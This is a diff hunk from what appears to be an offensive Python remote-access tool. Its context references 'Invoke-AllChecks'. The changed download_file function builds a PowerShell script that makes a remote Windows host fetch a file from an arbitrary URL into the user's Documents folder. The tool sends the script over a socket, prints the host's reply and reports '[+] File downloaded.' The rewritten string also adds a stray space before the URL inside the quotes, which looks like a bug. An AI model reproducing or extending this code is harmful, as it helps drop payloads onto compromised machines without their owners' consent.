@@ -118,11 +118,13 @@ Invoke-AllChecks"""
 
 
 def download_file(s, link, filename):
-    d = "cd %UserProfile%\\Documents\n$url = \"" + link + '''\"
-    $output = \"'''+ '%UserProfile%\\Documents\\' +filename + """\"
-    $start_time = Get-Date
-    Invoke-WebRequest -Method Get -Uri $url -OutFile $output
-    Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"\n """
+    d = """cd %UserProfile%\\Documents
+$url = \" """ + link + '''\"
+$output = \"'''+ '%UserProfile%\\Documents\\' +filename + """\"
+$start_time = Get-Date
+Invoke-WebRequest -Method Get -Uri $url -OutFile $output
+Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"
+"""
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
